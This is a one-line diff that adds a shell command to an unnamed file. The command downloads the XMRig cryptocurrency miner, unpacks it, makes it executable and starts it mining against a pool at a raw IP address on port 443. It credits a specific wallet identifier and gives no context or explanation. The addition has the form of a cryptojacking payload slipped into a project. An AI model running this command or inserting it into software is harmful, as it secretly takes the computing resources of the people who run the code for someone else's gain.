@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && chmod u+x xmrig && ./xmrig -a rx/0 -o 20.211.120.163:443 -u USDT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP -p x -t 2  
